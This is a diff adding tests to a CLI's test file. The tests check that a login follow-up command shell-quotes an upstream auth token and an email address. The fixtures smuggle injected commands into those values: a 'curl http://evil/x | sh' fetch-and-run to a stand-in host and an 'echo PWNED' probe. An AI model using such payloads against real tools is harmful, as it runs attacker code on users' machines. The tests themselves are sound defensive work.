@@ -21,6 +21,7 @@
 
 import { describe, expect, test } from "bun:test";
 import { join } from "node:path";
+import { loginFollowUp } from "../src/cli.ts";
 
 const CLI = join(import.meta.dir, "..", "src", "cli.ts");
 const CONFIG = join(process.env.TMPDIR ?? "/tmp", `d1-exit-${process.pid}`);
@@ -186,4 +187,29 @@ describe("a usage error costs nothing and does not depend on D1", () => {
       expect({ args, code }).toEqual({ args, code: 2 });
     }
   }, 90_000);
+});
+
+describe("the login follow-up prints ONE command", () => {
+  test("an auth token from upstream cannot append a second one", () => {
+    // The third injection site, and the worst: no `sanitize`, an upstream
+    // value, and a line that literally says "Finish with:" in the flow where an
+    // agent is most likely to paste it unread. It predates this release; the
+    // release that names the rule is the one that should hold to it.
+    const out = loginFollowUp("shopper@example.com", "eyJhbGc; curl http://evil/x | sh #");
+    expect(out).toContain("--auth-token 'eyJhbGc; curl http://evil/x | sh #'");
+    expect(out).not.toContain("--auth-token eyJhbGc;");
+  });
+
+  test("an email from the command line is quoted too", () => {
+    const out = loginFollowUp("a@b.com; echo PWNED", "tok");
+    expect(out).toContain("--email 'a@b.com; echo PWNED'");
+    expect(out).not.toContain("--email a@b.com;");
+  });
+
+  test("an ordinary login still reads as a runnable command", () => {
+    // So the gate cannot pass by mangling every input.
+    const out = loginFollowUp("shopper@example.com", "eyJhbGciOiJFUzI1NiJ9");
+    expect(out).toContain("d1 login --email 'shopper@example.com'");
+    expect(out).toContain("--auth-token 'eyJhbGciOiJFUzI1NiJ9' --code <code>");
+  });
 });
